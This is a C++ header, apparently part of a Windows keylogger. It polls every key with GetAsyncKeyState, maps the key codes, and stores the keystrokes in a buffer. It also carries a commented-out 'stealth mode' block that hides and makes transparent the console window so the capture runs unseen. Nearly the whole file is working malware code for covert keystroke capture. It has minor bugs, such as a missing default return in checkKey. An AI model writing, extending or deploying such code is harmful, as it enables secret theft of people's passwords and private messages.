#pragma once
#include <conio.h>
#include <Windows.h>

namespace capture
{
	HWND window = GetConsoleWindow();
	LONG cur_style = GetWindowLong(window, GWL_EXSTYLE);
	std::string buffer = "";
	int bufferSize = 0;
	bool keyIsPressed = false;;
	DWORD repeatDelay = 0;
	DWORD repeatRate = 0;
	float sleepTime = 0;
	float delayTime = 0;

	bool initOverlay()
	{
		//ENABLE THIS SECTION TO ENABLE STEALTH MODE ///////////////////////////////////////////////////////
		
		/*
		ShowWindow(window, SW_HIDE);
		SetWindowLong(window, GWL_EXSTYLE, GetWindowLong(window, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
		ShowWindow(window, SW_SHOW);

		SetLayeredWindowAttributes(window, 0, 0, LWA_ALPHA);
		SetWindowLong(window, GWL_EXSTYLE, cur_style | WS_EX_TRANSPARENT | WS_EX_LAYERED);
		
		SetWindowPos(window, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		SystemParametersInfo(SPI_GETKEYBOARDDELAY, 0, &repeatDelay, 0);
		SystemParametersInfo(SPI_GETKEYBOARDSPEED, 0, &repeatRate, 0);
		*/

		////////////////////////////////////////////////////////////////////////////////////////////////////


		sleepTime = (0.903225f * (float)repeatRate) + 2.0f;
		delayTime = (250 * repeatDelay) + 250;

		return true;
	} 
	char checkKey(int key)
	{
		switch (key)
		{
		case 8:
			return VK_BACK;
		case 9:
			return VK_TAB;

		case 12:
			return VK_CLEAR;
		case 13:
			return VK_RETURN;

		case 16:
			return VK_SHIFT;
		case 17:
			return VK_CONTROL;
		case 18:
			return VK_MENU;
		case 19:
			return VK_PAUSE;
		case 20:
			return VK_CAPITAL;

		case 27:
			return VK_ESCAPE;

		case 32:
			return VK_SPACE;
		case 33:
			return VK_PRIOR; //page up
		case 34:
			return VK_NEXT; //page down
		case 35:
			return VK_END;
		case 36:
			return VK_HOME;
		case 37:
			return VK_LEFT;
		case 38:
			return VK_UP;
		case 39:
			return VK_RIGHT;
		case 40:
			return VK_DOWN;
		case 41:
			return VK_SELECT;
		case 42:
			return VK_PRINT;
		case 43:
			return VK_EXECUTE;
		case 44:
			return VK_SNAPSHOT;
		case 45:
			return VK_INSERT;
		case 46:
			return VK_DELETE;
		case 47:
			return VK_HELP;
		case 48:
			return 0x30; //0
		case 49:
			return 0x31; //1
		case 50:
			return 0x32; //2
		case 51:
			return 0x33; //3
		case 52:
			return 0x34; //...
		case 53:
			return 0x35;
		case 54:
			return 0x36;
		case 55:
			return 0x37;
		case 56:
			return 0x38; //...
		case 57:
			return 0x39; //9

		case 65:
			return 0x41; //a
		case 66:
			return 0x42; //b
		case 67:
			return 0x43; //c
		case 68:
			return 0x44; //d
		case 69:
			return 0x45; //...
		case 70:
			return 0x46;
		case 71:
			return 0x47;
		case 72:
			return 0x48;
		case 73:
			return 0x49;
		case 74:
			return 0x4A;
		case 75:
			return 0x4B;
		case 76:
			return 0x4C;
		case 77:
			return 0x4D;
		case 78:
			return 0x4E;
		case 79:
			return 0x4F;
		case 80:
			return 0x50;
		case 81:
			return 0x51;
		case 82:
			return 0x52;
		case 83:
			return 0x53;
		case 84:
			return 0x54;
		case 85:
			return 0x55;
		case 86:
			return 0x56;
		case 87:
			return 0x57;
		case 88:
			return 0x58; //...
		case 89:
			return 0x59; //y
		case 90:
			return 0x5A; //z

		case 95:
			return VK_SLEEP;
		case 96:
			return VK_NUMPAD0;
		case 97:
			return VK_NUMPAD1;
		case 98:
			return VK_NUMPAD2;
		case 99:
			return VK_NUMPAD3;
		case 100:
			return VK_NUMPAD4;
		case 101:
			return VK_NUMPAD5;
		case 102:
			return VK_NUMPAD6;
		case 103:
			return VK_NUMPAD7;
		case 104:
			return VK_NUMPAD8;
		case 105:
			return VK_NUMPAD9;
		case 106:
			return VK_MULTIPLY;
		case 107:
			return VK_ADD;
		case 108:
			return VK_SEPARATOR;
		case 109:
			return VK_SUBTRACT;
		case 110:
			return VK_DECIMAL;
		case 111:
			return VK_DIVIDE;
		}
	}
	
	void monitor()
	{
		char lastKeyPress;
		for (int i = 8; i < 112; i++) {
			if (GetAsyncKeyState('!') & 0x8000)
			{
				buffer.push_back('!');
				bufferSize++;
				while (GetAsyncKeyState('!') & 0x8000)
				{
					//wait
				}
			}
			else if (GetAsyncKeyState('?'))
			{
				buffer.push_back('?');
				bufferSize++;
				while (GetAsyncKeyState('?') & 0x8000)
				{
					//wait
				}
			}
			else if (GetAsyncKeyState(i) & 0x8000)
			{
				lastKeyPress = checkKey(i);
				buffer.push_back(lastKeyPress);
				bufferSize++;
				while (GetAsyncKeyState(i) & 0x8000)
				{
					//wait
				}
				//break;
				//std::cout << checkKey(i) << std::endl;
			} 

		}
	}

		
}




